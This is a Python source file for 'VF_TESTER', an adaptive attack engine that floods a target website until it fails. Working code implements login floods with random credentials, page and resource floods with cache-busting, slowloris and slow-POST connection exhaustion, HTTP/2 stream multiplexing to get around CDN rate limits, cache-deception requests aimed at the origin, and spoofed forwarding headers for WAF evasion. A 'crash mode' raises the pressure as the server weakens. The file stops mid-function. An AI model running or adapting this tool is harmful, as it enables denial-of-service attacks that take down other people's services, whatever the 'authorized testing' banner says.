#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║     VF_TESTER — Adaptive Attack Engine                                  ║
║     Part of the VF (Vector-Finder) Architecture                         ║
║                                                                           ║
║  Reads VF_PROFILE.json from VF_FINDER and automatically builds           ║
║  a customized attack strategy based on detected technologies:             ║
║                                                                           ║
║  - ASP.NET Strategy: ViewState flood, EventValidation, form POST         ║
║  - PHP/WordPress Strategy: xmlrpc, wp-login, PHP session flood           ║
║  - API Strategy: REST endpoint flooding, JSON payloads                   ║
║  - WAF Evasion: Per-WAF bypass techniques (Cloudflare, Arvan, etc.)      ║
║  - Smart Crash Mode: Detects server weakness → increases pressure        ║
║  - Live Dashboard: Real-time stats + request log                         ║
║  - Keyboard Controls: +/- to adjust workers, q to quit                   ║
║                                                                           ║
║  FOR AUTHORIZED TESTING ONLY!                                             ║
╚═══════════════════════════════════════════════════════════════════════════╝

Usage:
  # Auto mode: scan + attack (runs FINDER first)
  python VF_TESTER.py https://target.com

  # Profile mode: use existing FINDER profile
  python VF_TESTER.py --profile VF_PROFILE.json

  # Manual overrides
  python VF_TESTER.py --profile VF_PROFILE.json --max-workers 5000 --crash-mode

Keyboard Controls (during run):
  +   Increase workers (+step)
  -   Decrease workers (-step)
  q   Quit gracefully

Requirements:
  pip install aiohttp httpx[http2] aiohttp-socks beautifulsoup4
"""

import asyncio
import argparse
import time
import statistics
import sys
import json
import random
import string
import re
import os
import platform
import socket
import signal
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Set, Tuple, Any
from collections import deque
from urllib.parse import urlparse, urljoin, urlencode

# ═══ Dynamic Module Path Setup ═══
# Find VF_FINDER.py in multiple possible locations (flat + modular directory structures)
_THIS_DIR = os.path.dirname(os.path.abspath(__file__))
_PATH_SEARCHES = [
    _THIS_DIR,                          # Same directory (flat structure)
    os.path.join(_THIS_DIR, 'finder'),  # finder/ subdirectory (modular)
    os.path.join(_THIS_DIR, '..'),      # Parent directory
    os.path.join(_THIS_DIR, '..', 'finder'),  # ../finder/
    os.getcwd(),                        # Current working directory
    os.path.join(os.getcwd(), 'finder'),# CWD/finder/
]
for _p in _PATH_SEARCHES:
    _p = os.path.normpath(_p)
    if os.path.isdir(_p) and _p not in sys.path:
        sys.path.insert(0, _p)

IS_WINDOWS = platform.system() == 'Windows'

if IS_WINDOWS:
    try:
        import msvcrt
        HAS_MSVCRT = True
    except ImportError:
        HAS_MSVCRT = False
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass
else:
    try:
        import tty
        import termios
        HAS_TERMIOS = True
    except ImportError:
        HAS_TERMIOS = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

if not HAS_AIOHTTP:
    print("[ERROR] aiohttp is required! pip install aiohttp")
    sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
# Colors
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'

    @staticmethod
    def clear_line():
        return '\033[2K'


# ═══════════════════════════════════════════════════════════════════════════════
# User-Agent Pool
# ═══════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Edg/122.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)

def rand_user(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def rand_pass(length=10):
    chars = string.ascii_letters + string.digits + "!@#$%"
    return ''.join(random.choices(chars, k=length))

def rand_cache_bust() -> str:
    return f"_={random.randint(100000, 999999)}"


# ═══════════════════════════════════════════════════════════════════════════════
# Live Request Log
# ═══════════════════════════════════════════════════════════════════════════════

class LiveLog:
    def __init__(self, max_lines: int = 8):
        self.max_lines = max_lines
        self._lines: deque = deque(maxlen=max_lines)
        self._lock = asyncio.Lock()

    async def add(self, mode: str, status: Optional[int], rt: float,
                  err: Optional[str] = None, url: str = "", hint: str = ""):
        async with self._lock:
            self._lines.append({
                'ts': time.strftime("%H:%M:%S"), 'mode': mode, 'status': status,
                'rt': rt, 'err': err, 'url': url, 'hint': hint,
            })

    def get_lines(self) -> List[dict]:
        return list(self._lines)

    def format_line(self, entry: dict) -> str:
        mode_colors = {'login': C.CY, 'page': C.B, 'resource': C.M,
                       'slowloris': C.Y, 'api': C.G, 'viewstate': C.M, 'wp': C.CY,
                       'slow_post': C.Y, 'h2mux': C.CY, 'cache_decep': C.M, 'origin': C.G,
                       'graphql': C.G, 'spa_route': C.B, 'ssr_render': C.M}
        mode_icons = {'login': 'AUTH', 'page': 'PAGE', 'resource': 'RES ',
                      'slowloris': 'SLOW', 'api': 'API ', 'viewstate': 'VS  ', 'wp': 'WP  ',
                      'slow_post': 'SPO ', 'h2mux': 'H2M ', 'cache_decep': 'CD  ', 'origin': 'ORI ',
                      'graphql': 'GQL ', 'spa_route': 'SPA ', 'ssr_render': 'SSR '}
        mc = mode_colors.get(entry['mode'], C.W)
        icon = mode_icons.get(entry['mode'], '????')
        status = entry['status']
        if status is not None:
            sc = C.G if status < 300 else C.Y if status < 500 else C.R
            status_str = f"{sc}{status:>3}{C.RS}"
        else:
            status_str = f"{C.R}ERR{C.RS}"
        rt = entry['rt']
        rtc = C.G if rt < 0.5 else C.Y if rt < 2.0 else C.R
        rt_str = f"{rtc}{rt*1000:>6.0f}ms{C.RS}"
        err_str = f" {C.R}[{entry['err']}]{C.RS}" if entry['err'] else ""
        url = entry.get('url', '')
        if len(url) > 45: url = "..." + url[-42:]
        hint = entry.get('hint', '')
        hint_str = f" {C.DM}{hint[:25]}{C.RS}" if hint and not entry['err'] else ""
        return f"  {C.DM}{entry['ts']}{C.RS} {mc}{icon}{C.RS} {status_str} {rt_str} {C.DM}{url[:45]}{C.RS}{err_str}{hint_str}"


# ═══════════════════════════════════════════════════════════════════════════════
# Keyboard Input Handler (cross-platform)
# ═══════════════════════════════════════════════════════════════════════════════

class KeyboardHandler:
    def __init__(self):
        self._fd = None
        self._old_settings = None
        self._queue: deque = deque(maxlen=32)
        self._running = False
        self._task = None

    async def start(self):
        self._running = True
        if IS_WINDOWS:
            self._task = asyncio.create_task(self._read_loop_windows())
        else:
            try:
                if HAS_TERMIOS:
                    self._fd = sys.stdin.fileno()
                    self._old_settings = termios.tcgetattr(self._fd)
                    tty.setraw(self._fd)
                    self._task = asyncio.create_task(self._read_loop_unix())
                else:
                    return
            except Exception:
                return

    async def _read_loop_windows(self):
        while self._running:
            try:
                if HAS_MSVCRT and msvcrt.kbhit():
                    ch = msvcrt.getwch()
                    if ch: self._queue.append(ch)
                await asyncio.sleep(0.05)
            except Exception:
                await asyncio.sleep(0.1)

    async def _read_loop_unix(self):
        loop = asyncio.get_event_loop()
        while self._running:
            try:
                ch = await loop.run_in_executor(None, self._read_char_unix)
                if ch: self._queue.append(ch)
            except Exception:
                await asyncio.sleep(0.1)

    def _read_char_unix(self) -> Optional[str]:
        try: return sys.stdin.read(1)
        except: return None

    def get_key(self) -> Optional[str]:
        keys = []
        while self._queue: keys.append(self._queue.popleft())
        for key in keys:
            if key in ('+', '='): return '+'
            elif key in ('-', '_'): return '-'
            elif key in ('q', 'Q'): return 'q'
            elif key == '\x03': return 'q'
        return None

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()
            try: await self._task
            except asyncio.CancelledError: pass
        if not IS_WINDOWS and self._old_settings and self._fd and HAS_TERMIOS:
            try: termios.tcsetattr(self._fd, termios.TCSADRAIN, self._old_settings)
            except: pass


# ═══════════════════════════════════════════════════════════════════════════════
# Form Field Extraction
# ═══════════════════════════════════════════════════════════════════════════════

def extract_form_fields(html: str) -> Dict[str, str]:
    fields = {}
    hidden_inputs = re.findall(r'<input[^>]*type=["\']?hidden["\']?[^>]*>', html, re.IGNORECASE)
    for inp in hidden_inputs:
        name_match = re.search(r'name=(["\']?)([^>"\'\s]+)\1', inp)
        value_match = re.search(r'value=(["\']?)([^>"\']*)\1', inp)
        if name_match:
            fields[name_match.group(2)] = value_match.group(2) if value_match else ""
    asp_inputs = re.findall(r'<input[^>]*name=(["\']?)(__[^>"\'\s]+)\1[^>]*value=(["\']?)([^>"\']*)\3[^>]*>', html)
    asp_inputs_rev = re.findall(r'<input[^>]*value=(["\']?)([^>"\']*)\1[^>]*name=(["\']?)(__[^>"\'\s]+)\3[^>]*>', html)
    for m in asp_inputs:
        if m[1] not in fields: fields[m[1]] = m[3]
    for m in asp_inputs_rev:
        if m[3] not in fields: fields[m[3]] = m[1]
    return fields


# ═══════════════════════════════════════════════════════════════════════════════
# Data Classes
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class HitResult:
    ok: bool
    code: Optional[int]
    rt: float
    mode: str = ""
    err: Optional[str] = None
    hint: str = ""
    ts: float = field(default_factory=time.time)
    url: str = ""

@dataclass
class Stats:
    total: int = 0
    ok: int = 0
    fail: int = 0
    rate_limited: int = 0
    login_ok: int = 0
    login_fail: int = 0
    page_hits: int = 0
    resource_hits: int = 0
    slowloris_hits: int = 0
    api_hits: int = 0
    viewstate_hits: int = 0
    wp_hits: int = 0
    slow_post_hits: int = 0
    h2mux_hits: int = 0
    cache_decep_hits: int = 0
    origin_hits: int = 0
    graphql_hits: int = 0
    spa_route_hits: int = 0
    ssr_render_hits: int = 0
    rts: deque = field(default_factory=lambda: deque(maxlen=50000))
    codes: Dict[int, int] = field(default_factory=dict)
    _recent: deque = field(default_factory=lambda: deque(maxlen=5000))
    t0: float = 0
    t1: float = 0
    users: int = 0

    @property
    def dur(self):
        return (self.t1 if self.t1 > self.t0 else time.time()) - self.t0 if self.t0 else 0
    @property
    def rps(self):
        return self.total / self.dur if self.dur > 0 else 0
    @property
    def rrps(self):
        now = time.time()
        r = [x for x in self._recent if now - x.ts < 5]
        return len(r) / 5 if r else 0
    @property
    def rart(self):
        now = time.time()
        r = [x.rt for x in self._recent if now - x.ts < 5]
        return statistics.mean(r) if r else 0


# ═══════════════════════════════════════════════════════════════════════════════
# Server Health Monitor (Smart Crash Mode)
# ═══════════════════════════════════════════════════════════════════════════════

class ServerHealthMonitor:
    def __init__(self):
        self._rt_window: deque = deque(maxlen=200)
        self._status_window: deque = deque(maxlen=200)
        self._timeout_streak: int = 0
        self._health_history: deque = deque(maxlen=20)
        self._pressure_multiplier: float = 1.0
        self.crash_mode_active: bool = False
        self.server_dying: bool = False
        self._baseline_rt: float = 0
        self._baseline_set: bool = False

    def record(self, result: HitResult):
        self._rt_window.append(result.rt)
        self._status_window.append((result.code, result.ok))
        if result.err and ('Timeout' in (result.err or '') or 'Connect' in (result.err or '')):
            self._timeout_streak += 1
        else:
            self._timeout_streak = max(0, self._timeout_streak - 1)
        if not self._baseline_set and result.ok and result.rt > 0:
            self._baseline_rt = result.rt
            self._baseline_set = True

    def calculate_health(self) -> float:
        if len(self._status_window) < 5: return 1.0
        fails = sum(1 for _, ok in self._status_window if not ok)
        error_score = max(0, 1.0 - (fails / len(self._status_window)) * 2)
        if self._rt_window and self._baseline_rt > 0:
            avg_rt = statistics.mean(list(self._rt_window)[-50:])
            rt_ratio = avg_rt / max(self._baseline_rt, 0.01)
            rt_score = max(0, 1.0 - (rt_ratio - 1.0) / 2.0)
        else:
            rt_score = 1.0
        timeout_score = max(0, 1.0 - self._timeout_streak / 10.0)
        server_errors = sum(1 for code, _ in self._status_window if code is not None and code >= 500)
        se_score = max(0, 1.0 - (server_errors / len(self._status_window)) * 3)
        health = error_score * 0.4 + rt_score * 0.3 + timeout_score * 0.2 + se_score * 0.1
        self._health_history.append(health)
        return health

    def get_pressure_advice(self, cur: int, max_w: int, step: int) -> Tuple[str, int]:
        health = self.calculate_health()
        avg_health = statistics.mean(self._health_history) if self._health_history else 1.0
        recent = self._health_history[-1] if self._health_history else 1.0
        self.server_dying = (recent < 0.3 and self._timeout_streak > 3) or \
                           (recent < 0.15 and len(self._status_window) > 20)
        if health < 0.3:
            self.crash_mode_active = True
            return "MAXIMUM", min(step * 5, max_w - cur)
        elif health < 0.5:
            self.crash_mode_active = True
            return "CRASH", min(step * 3, max_w - cur)
        elif health < 0.65:
            self.crash_mode_active = True
            return "PRESSURE", min(step * 2, max_w - cur)
        else:
            self.crash_mode_active = False
            return "RAMP", min(step, max_w - cur)

    @property
    def health_score(self) -> float:
        return self._health_history[-1] if self._health_history else 1.0

    @property
    def trend(self) -> str:
        if len(self._health_history) < 5: return "unknown"
        recent = list(self._health_history)[-5:]
        older = list(self._health_history)[-10:-5] if len(self._health_history) >= 10 else recent
        diff = statistics.mean(recent) - statistics.mean(older)
        if diff > 0.05: return "improving"
        elif diff < -0.05: return "degrading"
        return "stable"


# ═══════════════════════════════════════════════════════════════════════════════
# VF_TESTER — Adaptive Attack Engine
# ═══════════════════════════════════════════════════════════════════════════════

class VFTester:
    """
    VF_TESTER reads a VF_PROFILE.json from VF_FINDER and automatically
    configures an optimized, adaptive attack strategy.
    """

    def __init__(self, profile_path: Optional[str] = None,
                 target_url: Optional[str] = None):
        self.profile: Dict[str, Any] = {}
        self.attack: Dict[str, Any] = {}

        # Load profile if provided
        if profile_path:
            self._load_profile(profile_path)
        elif target_url:
            self._create_minimal_profile(target_url)

        # Extract key info from profile
        p = self.profile
        self.url = p.get("url", target_url or "")
        parsed = urlparse(self.url)
        self.site_root = f"{parsed.scheme}://{parsed.netloc}"
        self.domain = parsed.netloc.split(':')[0]

        # Core state
        self.stats = Stats()
        self._stop = asyncio.Event()
        self._snaps: List[dict] = []

        # v4 features
        self.health_monitor = ServerHealthMonitor()
        self.live_log = LiveLog(max_lines=8)
        self.keyboard = KeyboardHandler()
        self._manual_delta: int = 0

        # Detected technology info
        self.detected_waf = p.get("waf")
        self.detected_cms = p.get("cms")
        self.is_aspnet = p.get("viewstate_present", False)
        self.is_wordpress = p.get("cms") and "WordPress" in (p.get("cms") or "")
        self.has_api = bool(p.get("api_endpoints"))

        # ASP.NET specific
        self._viewstate_cache: Dict[str, str] = {}
        self._viewstate_ts: float = 0
        self._viewstate_ttl: float = 5.0  # Refresh more often to avoid stale tokens
        self._viewstate_lock = asyncio.Lock()
        self.username_field = p.get("login_fields", {}).get("username", "username")
        self.password_field = p.get("login_fields", {}).get("password", "password")

        # Per-session ASP.NET token tracking
        self._session_cookies: Dict[int, Dict[str, str]] = {}  # worker_id -> cookies
        self._invalid_count: int = 0
        self._invalid_threshold: int = 5  # Force full refresh after N invalid responses

        # Targets from profile
        self.page_targets: List[str] = self.attack.get("page_targets", [])
        self.resource_targets: List[str] = self.attack.get("resource_targets", [])

        # Worker config from profile
        wc = self.attack.get("worker_config", {})
        self.initial_workers = wc.get("initial_workers", 200)
        self.max_workers = wc.get("max_workers", 10000)
        self.step = wc.get("step", 300)
        self.step_duration = wc.get("step_duration", 3)

        # Request config
        rc = self.attack.get("request_config", {})
        self.request_delay_ms = rc.get("delay_between_requests_ms", 5)
        self.enable_cache_bust = rc.get("cache_bust", True)
        self.enable_ua_rotation = rc.get("user_agent_rotation", True)

        # Evasion config
        ec = self.attack.get("evasion_config", {})
        self.enable_header_random = ec.get("header_randomization", False)

    def _load_profile(self, path: str):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                self.profile = json.load(f)
            self.attack = self.profile.get("attack_profile", {})
            print(f"  {C.G}[VF] Profile loaded: {path}{C.RS}")
            print(f"  {C.G}[VF] Strategy: {self.attack.get('recommended_strategy', 'AUTO')}{C.RS}")
        except Exception as e:
            print(f"  {C.R}[ERROR] Failed to load profile: {e}{C.RS}")
            self._create_minimal_profile("")

    def _create_minimal_profile(self, url: str):
        self.profile = {"url": url, "waf": None, "cms": None,
                        "viewstate_present": False, "technologies": []}
        self.attack = {"recommended_strategy": "GENERIC_FLOOD",
                       "attack_vectors": ["LOGIN_FLOOD", "PAGE_FLOOD", "RESOURCE_FLOOD"],
                       "worker_config": {"initial_workers": 10, "max_workers": 10000,
                                         "step": 50, "step_duration": 5, "ramp_strategy": "GRADUAL"},
                       "page_targets": [], "resource_targets": [],
                       "waf_strategy": {"detected": False},
                       "request_config": {"delay_between_requests_ms": 5},
                       "evasion_config": {"rotate_user_agent": True, "cache_bust": True}}

    def stop(self):
        self._stop.set()

    def _base_headers(self) -> Dict[str, str]:
        headers = {
            "User-Agent": random_ua() if self.enable_ua_rotation else USER_AGENTS[0],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }
        if self.enable_header_random:
            # Add random headers for WAF evasion
            if random.random() > 0.5:
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            if random.random() > 0.7:
                headers["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            if random.random() > 0.6:
                headers["Referer"] = self.url
        return headers

    async def _refresh_viewstate(self, session):
        """Refresh ASP.NET ViewState/EventValidation tokens.
        
        Uses a lock to avoid hammering the server with GET requests.
        When 'invalid user client' is detected, forces immediate refresh.
        """
        async with self._viewstate_lock:
            now = time.time()
            force_refresh = (
                now - self._viewstate_ts > self._viewstate_ttl or
                not self._viewstate_cache or
                self._invalid_count >= self._invalid_threshold
            )
            if force_refresh:
                self._invalid_count = 0
                try:
                    async with session.get(self.url, headers=self._base_headers(),
                                           ssl=False, allow_redirects=True) as resp:
                        # Handle redirect to login page — follow and re-fetch
                        if resp.status in (301, 302, 303, 307, 308):
                            redirect_url = resp.headers.get('Location', self.url)
                            if not redirect_url.startswith('http'):
                                redirect_url = urljoin(self.url, redirect_url)
                            async with session.get(redirect_url, headers=self._base_headers(),
                                                   ssl=False, allow_redirects=True) as resp2:
                                html = await resp2.text()
                        else:
                            html = await resp.text()
                        # Ensure cookies from the response are captured by the session
                        self._viewstate_cache = extract_form_fields(html)
                        self._viewstate_ts = now
                except Exception:
                    pass
        return dict(self._viewstate_cache)

    # ─── Attack Workers ──────────────────────────────────────────────────────

    async def _worker_login(self, session, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            t = time.time()
            try:
                hidden_fields = await self._refresh_viewstate(session) if self.is_aspnet else {}
                form_data = {**hidden_fields,
                            self.username_field: rand_user(),
                            self.password_field: rand_pass()}
                headers = {**self._base_headers(),
                          "Content-Type": "application/x-www-form-urlencoded",
                          "Origin": self.site_root, "Referer": self.url}
                async with session.post(self.url, headers=headers, data=form_data,
                                       ssl=False, allow_redirects=False) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    # Detect "invalid" in response — force ViewState refresh
                    if "invalid" in body.lower():
                        self._invalid_count += 1
                        self._viewstate_ts = 0  # Force immediate refresh
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="login", hint=f"Login {resp.status}", url=self.url)
                    await self.live_log.add("login", resp.status, elapsed, None, self.url, result.hint)
                    self.health_monitor.record(result)
            except asyncio.TimeoutError:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err="Timeout")
                await self.live_log.add("login", None, result.rt, "Timeout", self.url)
                self.health_monitor.record(result)
            except Exception as e:
                msg = type(e).__name__
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=msg)
                await self.live_log.add("login", None, result.rt, msg, self.url)
                self.health_monitor.record(result)

            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_page(self, session, pages, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        if not pages: pages = [self.url]
        consecutive_fails = 0
        while not self._stop.is_set():
            url = random.choice(pages)
            t = time.time()
            try:
                busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
                async with session.get(busted, headers=self._base_headers(),
                                       ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="page", hint=f"Page {resp.status} ({len(body):,}B)", url=url)
                    await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
                    self.health_monitor.record(result)
            except asyncio.TimeoutError:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err="Timeout", url=url)
                await self.live_log.add("page", None, result.rt, "Timeout", url)
                self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err=type(e).__name__, url=url)
                await self.live_log.add("page", None, result.rt, type(e).__name__, url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_resource(self, session, resources, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        if not resources: return
        consecutive_fails = 0
        while not self._stop.is_set():
            urls = random.sample(resources, min(3, len(resources)))
            result = None
            for url in urls:
                if self._stop.is_set(): break
                t = time.time()
                try:
                    busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
                    headers = {"User-Agent": random_ua(), "Accept": "*/*", "Connection": "keep-alive"}
                    async with session.get(busted, headers=headers, ssl=False) as resp:
                        data = await resp.read()
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="resource", hint=f"Res {resp.status} ({len(data):,}B)", url=url)
                        await self.live_log.add("resource", resp.status, elapsed, None, url, result.hint)
                        self.health_monitor.record(result)
                except Exception as e:
                    result = HitResult(ok=False, code=None, rt=time.time()-t, mode="resource", err=type(e).__name__, url=url)
                    await self.live_log.add("resource", None, result.rt, type(e).__name__, url)
                    self.health_monitor.record(result)
                self._record(result)
            if result is None or not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
            await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_slowloris(self, session, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        while not self._stop.is_set():
            t = time.time()
            try:
                headers = self._base_headers()
                headers["Content-Length"] = str(random.randint(10000, 100000))
                async with session.get(self.url, headers=headers, ssl=False,
                                       timeout=aiohttp.ClientTimeout(total=30),
                                       allow_redirects=False) as resp:
                    await asyncio.sleep(random.uniform(5, 15))
                    elapsed = time.time() - t
                    result = HitResult(ok=True, code=resp.status, rt=elapsed, mode="slowloris",
                                      hint=f"Slowloris {elapsed:.1f}s", url=self.url)
                    await self.live_log.add("slowloris", resp.status, elapsed, None, self.url, result.hint)
            except asyncio.TimeoutError:
                elapsed = time.time() - t
                result = HitResult(ok=True, code=None, rt=elapsed, mode="slowloris",
                                  hint=f"Slowloris timeout {elapsed:.1f}s", url=self.url)
                await self.live_log.add("slowloris", None, elapsed, None, self.url, "timeout")
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slowloris", err=type(e).__name__)
                await self.live_log.add("slowloris", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
            self._record(result)

    async def _worker_slow_post_read(self, session, delay=0):
        """Slow POST/READ attack — send body bytes slowly to exhaust CDN connection pool"""
        if delay > 0: await asyncio.sleep(delay)
        while not self._stop.is_set():
            t = time.time()
            try:
                headers = self._base_headers()
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                headers["Content-Length"] = str(random.randint(50000, 200000))
                headers["Transfer-Encoding"] = "chunked"
                
                async with session.post(self.url, headers=headers, data=self._slow_body_generator(),
                                       ssl=False, timeout=aiohttp.ClientTimeout(total=60),
                                       allow_redirects=False) as resp:
                    elapsed = time.time() - t
                    result = HitResult(ok=True, code=resp.status, rt=elapsed, mode="slow_post",
                                      hint=f"SlowPOST {resp.status} {elapsed:.1f}s", url=self.url)
                    await self.live_log.add("slow_post", resp.status, elapsed, None, self.url, result.hint)
            except asyncio.TimeoutError:
                elapsed = time.time() - t
                result = HitResult(ok=True, code=None, rt=elapsed, mode="slow_post",
                                  hint=f"SlowPOST timeout {elapsed:.1f}s", url=self.url)
                await self.live_log.add("slow_post", None, elapsed, None, self.url, "timeout")
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slow_post", err=type(e).__name__)
                await self.live_log.add("slow_post", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
            self._record(result)

    async def _slow_body_generator(self):
        """Async generator that yields body bytes slowly for Slow POST attack"""
        chunk_size = random.randint(1, 10)
        total_sent = 0
        max_size = random.randint(50000, 200000)
        while total_sent < max_size and not self._stop.is_set():
            chunk = random.choices(string.ascii_letters + string.digits, k=chunk_size)
            yield ''.join(chunk).encode('utf-8')
            total_sent += chunk_size
            await asyncio.sleep(random.uniform(0.05, 0.3))  # Slow down transmission

    async def _worker_http2_multiplex(self, session, delay=0):
        """HTTP/2 multiplexing attack — many streams over single connection to bypass CDN rate limits"""
        if delay > 0: await asyncio.sleep(delay)
        while not self._stop.is_set():
            t = time.time()
            try:
                # Try to use httpx for HTTP/2 support
                import httpx
                async with httpx.AsyncClient(http2=True, verify=False, timeout=15) as h2client:
                    # Send many concurrent requests over a single H2 connection
                    num_streams = random.randint(20, 50)
                    tasks = []
                    for _ in range(num_streams):
                        busted = f"{self.url}{'&' if '?' in self.url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else self.url
                        headers = {"User-Agent": random_ua(), "Accept": "text/html,*/*", 
                                  "Cache-Control": "no-cache"}
                        tasks.append(h2client.get(busted, headers=headers, follow_redirects=False))
                    
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    elapsed = time.time() - t
                    
                    ok_count = sum(1 for r in results if isinstance(r, httpx.Response) and r.status_code < 500)
                    fail_count = sum(1 for r in results if isinstance(r, Exception) or (isinstance(r, httpx.Response) and r.status_code >= 500))
                    
                    result = HitResult(ok=ok_count > 0, code=200, rt=elapsed, mode="h2mux",
                                      hint=f"H2Mux {num_streams} streams {ok_count}ok/{fail_count}fail {elapsed:.1f}s", url=self.url)
                    await self.live_log.add("h2mux", 200, elapsed, None, self.url, result.hint)
                    self.health_monitor.record(result)
            except ImportError:
                # httpx not available, fall back to regular requests
                await self._single_page(session, [self.url])
                return
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="h2mux", err=type(e).__name__)
                await self.live_log.add("h2mux", None, result.rt, type(e).__name__, self.url)
                self.health_monitor.record(result)
            self._record(result)
            await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_cache_deception(self, session, delay=0):
        """Cache deception attack — bypass CDN cache to hit origin server directly"""
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            t = time.time()
            try:
                # Build URL with cache-busting extensions that CDN doesn't cache
                # e.g., /page.css?rand=xxx or /page/..%2f..%2forigin
                path_tricks = [
                    lambda u: f"{u}{'&' if '?' in u else '?'}{rand_cache_bust()}",
                    lambda u: f"{u}{'&' if '?' in u else '?'}_=__{random.randint(100000,999999)}__",
                    lambda u: f"{u.rstrip('/')}/..%2f..%2f{rand_cache_bust()}",
                    lambda u: f"{u}{'&' if '?' in u else '?'}nocache={random.randint(1,99999)}.css",
                    lambda u: f"{u}{'&' if '?' in u else '?'}{rand_cache_bust()}.json",
                    lambda u: f"{u.rstrip('/')}/{rand_cache_bust()}/",
                ]
                url_trick = random.choice(path_tricks)(self.url)
                
                # Headers that force CDN to bypass cache
                headers = self._base_headers()
                headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
                headers["Pragma"] = "no-cache"
                headers["X-Arvan-Cache"] = "bypass"
                headers["X-Cache-Bypass"] = "true"
